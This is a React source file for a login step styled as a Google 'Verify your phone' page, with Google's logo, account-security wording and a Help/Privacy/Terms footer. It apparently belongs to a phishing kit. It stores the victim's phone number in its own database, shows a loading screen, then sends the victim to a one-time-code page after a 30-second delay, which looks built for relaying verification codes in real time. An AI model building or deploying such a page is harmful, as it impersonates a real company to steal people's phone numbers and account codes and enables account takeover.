import { useNavigate } from 'react-router-dom';
import React, { useState } from 'react';
import '../assets/css/PhoneLogin.css';
import { savePhone } from '../database/createUser';

const PhoneLogin = () => {
  const [phone, setPhone] = useState('');

  const navigate = useNavigate();

  const handleNext =async () => {
    if (phone.trim()) {
      await savePhone(phone);
  navigate('/loading');
      setTimeout(() => {
        navigate('/otp');
      }, 30000);
    }

  };

  return (
    <div className="container">
      <div className="card">
        <img
          src="../src/assets/google-logo.svg"
          alt="Google Logo"
          className="logo"
        />

        <h2>Verify your phone</h2>
        <h3>Enter your mobile number to continue</h3>

        <div className="input-group">
          <input
            type="tel"
            placeholder="Phone number"
            value={phone}
            onChange={e => setPhone(e.target.value)}
            className="phone-input"
          />
        </div>

        <p>
          We'll use your phone number to verify your identity and help keep your
          account secure.
          <a href="/"> Learn more</a>
        </p>

        <div className="card-bottom">
          <a href="/">Back</a>
          <button type="button" onClick={handleNext}>
            Next
          </button>
        </div>
      </div>

      <div className="footer">
        <select>
          <option>English (United States)</option>
          <option>Portuguese (Brazil)</option>
          <option>Spanish (Spain)</option>
        </select>

        <div className="footer-span">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>
  );
};

export default PhoneLogin;
